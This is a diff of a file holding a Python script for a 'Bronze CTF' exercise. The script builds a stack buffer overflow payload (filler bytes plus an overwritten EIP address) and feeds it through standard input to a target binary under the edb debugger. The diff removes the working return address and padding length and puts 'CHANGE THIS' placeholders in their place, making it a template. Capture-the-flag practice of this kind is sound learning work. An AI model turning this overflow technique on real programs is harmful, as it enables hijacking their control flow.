@@ -74,7 +74,9 @@ int main(int argc, char *argv[])
 
 python_md = """
 ```python
-# Bronze CTF - Corrected STDIN Injection
+
+
+# Bronze CTF
 
 import subprocess
 import os
@@ -86,12 +88,10 @@ DEBUGGER_NAME = 'edb'
 TARGET_EXECUTABLE = './bronze'
 
 # Your specific EIP address
-# Note: This payload is still structured for a stack buffer, not a command line arg.
-new_eip = struct.pack("<I", 0x08049280)
+new_eip = struct.pack("<I", 0x00000000)  # <<<<< CHANGE THIS <<<<<<<
 
 # The specific string parameter (your payload)
-# Total padding = 76 bytes (adjust this padding to match the STDIN buffer size)
-PAYLOAD_STRING = b'A' * 64 + b'B' * 16 + new_eip
+PAYLOAD_STRING = b'A' * 10 + b'B' * 10 + new_eip  # <<<<< CHANGE THIS <<<<<<<
 
 def run_program_with_stdin_injection():
     temp_file_path = None
@@ -125,7 +125,7 @@ def run_program_with_stdin_injection():
         )
 
         # 4. Process results (output may be limited since edb opens a terminal)
-        print("\n--- Execution Finished ---")
+        print("--- Execution Finished ---")
         if result.returncode != 0:
             print(f"Program exited with code {result.returncode}")
             # Common Linux exit code for SIGSEGV is 139
